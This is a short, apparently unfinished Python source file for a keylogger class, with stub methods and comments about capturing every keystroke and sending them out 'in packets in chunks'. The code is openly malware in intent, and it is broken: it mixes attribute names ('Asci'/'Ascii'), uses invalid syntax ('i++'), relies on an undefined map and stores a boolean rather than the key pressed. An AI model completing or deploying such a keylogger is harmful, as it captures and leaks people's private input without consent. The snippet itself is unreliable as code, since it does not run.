import os

class keylogger():
    '''
    This method gets the current process id, links to an 
    executable
    '''
    def current_process():
        return

    '''
    Takes in an event. From this event we store the values in a 
    map. In reality we should record all keystrokes, send packets in chunks
    and then analyze.
    '''
    def keystrokes(e):
        # Pass in the current process
        if e.Asci > 32 and e.Ascii < 1277:
                i=0
                d[i++] = str(e.Asci > 32 and e.Ascii < 1277)
